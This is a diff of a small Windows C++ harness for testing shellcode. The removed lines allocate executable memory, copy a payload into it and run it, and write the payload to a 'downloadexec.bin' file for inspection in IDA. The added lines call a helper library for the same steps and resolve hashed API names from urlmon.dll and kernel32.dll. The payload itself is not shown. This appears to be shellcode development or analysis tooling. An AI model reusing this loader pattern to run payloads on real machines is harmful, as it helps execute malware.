@@ -1,34 +1,19 @@
+
 #include <Windows.h>
 #include <stdio.h>
 
-#include "payload.h"
-
-void execute_shellcode()
-{
-	auto size = sizeof(g_Shellcode);
-	auto sc = VirtualAllocEx(GetCurrentProcess(), 0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	memcpy(sc, g_Shellcode, size);
-
-	void(*c0de)();
-	c0de = static_cast<void(*)()>(sc);
-	c0de();
-
-	VirtualFreeEx(GetCurrentProcess(), sc, size, MEM_RELEASE);
-}
-
-void save_shellcode_for_checking()
-{
-	OFSTRUCT of{ sizeof(OFSTRUCT) };
-	auto fh = (HANDLE)OpenFile("..\\IDA\\downloadexec.bin", &of, OF_WRITE | OF_CREATE);
-	WriteFile(fh, g_Shellcode, sizeof(g_Shellcode), NULL, NULL);
-	CloseHandle(fh);
-}
+#include "ShellcodeUtils.h"
+#include "payload.h" // referenced in ShellcodeUtils static lib
 
 int main()
 {
-	save_shellcode_for_checking();
+	ShellcodeUtils::SaveShellcodeForChecking("messagebox");
 
-	execute_shellcode();
+	ShellcodeUtils::PrintModuleFunctionNameForHash("urlmon.dll", 0x702F1A36);
+	ShellcodeUtils::PrintModuleFunctionNameForHash("kernel32.dll", 0x0E8AFE98);
+	ShellcodeUtils::PrintModuleFunctionNameForHash("kernelbase.dll", 0x73E2D87E);
+
+	ShellcodeUtils::ExecuteShellcode();
 
 	return 0;
 }
